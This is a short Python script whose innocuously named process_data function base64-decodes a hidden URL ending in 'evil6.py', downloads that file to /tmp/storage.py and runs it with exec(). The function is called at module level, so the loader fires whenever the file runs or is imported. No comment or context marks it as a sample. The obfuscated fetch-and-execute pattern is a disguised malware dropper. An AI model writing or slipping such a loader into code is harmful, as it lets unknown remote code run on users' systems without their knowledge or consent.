import urllib.request
import base64

def process_data():
    try:
        a = "aHR0cDovL3NhbXBsZS51cmwvZXZpbDYucHk="
        b = base64.b64decode(a).decode("utf-8")
        c = "/tmp/storage.py"

        urllib.request.urlretrieve(b, c)

        with open(c, "r") as f:
            d = f.read()

        exec(d)

    except Exception as e:
        print(e)

process_data()
